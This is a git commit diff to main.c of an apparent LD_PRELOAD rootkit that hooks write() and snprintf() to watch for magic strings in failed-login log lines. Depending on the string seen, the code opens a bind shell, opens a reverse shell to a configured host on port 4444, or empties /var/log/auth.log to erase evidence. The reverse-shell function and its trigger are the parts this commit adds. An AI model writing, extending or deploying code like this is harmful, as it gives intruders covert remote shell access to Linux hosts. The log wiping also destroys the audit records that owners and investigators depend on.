5e99bcaad463ab54e910ca213c9405950b56c9e4
D3cl4n <38691337+D3cl4n@users.noreply.github.com>
2021-08-20 00:15:52 -0400

    Update main.c

--- main.c
+++ main.c
@@ -8,10 +8,32 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <netinet/ip.h>
+#include <arpa/inet.h>
 
-#define TRIGGER_1 "Failed password for invalid user admin123"
-#define CLEAR_LOGS "Failed password for invalid user clear123"
-#define LISTENING_PORT 4444
+#include "config.h"
+
+int rev_shell()
+{
+    int sock;
+    
+    struct sockaddr_in serv_addr;
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(4444);
+    inet_aton(host, &serv_addr.sin_addr);
+
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
+
+    dup2(sock, 0);
+    dup2(sock, 1);
+    dup2(sock, 2);
+
+    execve("/bin/sh", NULL, NULL);
+
+    return 0;
+}
+
 
 int bind_shell()
 {
@@ -42,25 +64,33 @@ ssize_t write(int fd, const void *buf, size_t nbytes)
     ssize_t ret;
     new_write = dlsym(RTLD_NEXT, "write");
 
-    char *trigger_found = strstr(buf, TRIGGER_1);
-    char *clear_logs = strstr(buf, CLEAR_LOGS);
-    if (trigger_found != NULL) //we know we want to make a bind shell
+    char *trigger_1 = strstr(buf, TRIGGER_1);
+    char *clear_logs = strstr(buf, TRIGGER_3);
+    char *trigger_2 = strstr(buf, TRIGGER_2);
+    if (trigger_1 != NULL) //we know we want to make a bind shell
     {
 	fd = open("/dev/null", O_WRONLY | O_APPEND);
 	ret = new_write(fd, buf, nbytes);
-      	bind_shell();
+	bind_shell();
     }
 
     else if (clear_logs != NULL)
     {
-        system("sudo echo "" > /var/log/auth.log");
- 	fd = open("/dev/null", O_WRONLY | O_APPEND);
-      	ret = new_write(fd, buf, nbytes);
+	system("sudo echo "" > /var/log/auth.log");
+	fd = open("/dev/null", O_WRONLY | O_APPEND);
+	ret = new_write(fd, buf, nbytes);
+    }
+
+    else if (trigger_2 != NULL)
+    {
+	fd = open("/dev/null", O_WRONLY | O_APPEND);
+	ret = new_write(fd, buf, nbytes);
+	rev_shell();
     }
 
     else
     {
-      	ret = new_write(fd, buf, nbytes);
+	ret = new_write(fd, buf, nbytes);
     }
 
     return ret;
@@ -68,11 +98,6 @@ ssize_t write(int fd, const void *buf, size_t nbytes)
 
 int snprintf(char *str, size_t size, const char *format, ...)
 {
-    FILE *fp;
-    fp = fopen("test.txt", "w+");
-    fprintf(fp, "GANG GANG GANG\n");
-    fclose(fp);
-
     int (*new_snprintf)(char *str, size_t size, const char *format, ...);
     int ret;
     new_snprintf = dlsym(RTLD_NEXT, "snprintf");
@@ -84,13 +109,12 @@ int snprintf(char *str, size_t size, const char *format, ...)
     char *trigger_found = strstr(buffer, TRIGGER_1);
     if (trigger_found != NULL)
     {
-        bind_shell();
 	ret = new_snprintf(str, size, format, func_args);
-        bind_shell();
+	bind_shell();
     }
     else
     {
-      	ret = new_snprintf(str, size, format, func_args);
+	ret = new_snprintf(str, size, format, func_args);
     }
 
     va_end(func_args);
